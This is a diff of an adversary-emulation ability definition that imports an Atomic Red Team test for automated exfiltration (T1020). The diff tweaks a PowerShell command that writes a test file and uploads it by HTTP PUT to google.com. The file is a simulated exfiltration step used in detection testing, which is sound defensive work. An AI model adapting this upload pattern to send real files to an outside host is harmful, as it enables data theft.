@@ -15,7 +15,8 @@
         command: $fileName = "C:\temp\T1020_exfilFile.txt"; $url = "https://google.com";
           $file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil
           Test"; $contentType = "application/octet-stream"; try {Invoke-WebRequest
-          -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
+          -Uri $url -Method Put -ContentType $contentType -InFile $fileName -UseBasicParsing}
+          catch{}
         cleanup: $fileName = "#{file}"; Remove-Item -Path $fileName -ErrorAction Ignore
   plugin: atomic
   singleton: false
@@ -23,9 +24,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - t1020
   - exfiltration
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -39,4 +40,4 @@
         default: https://google.com
     technique_created: '2017-05-31T21:30:29.458Z'
     atomic_guid: 9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0
-    import_timestamp: '2026-10-20T07:08:31.104699Z'
+    import_timestamp: '2026-10-21T07:01:52.887378Z'
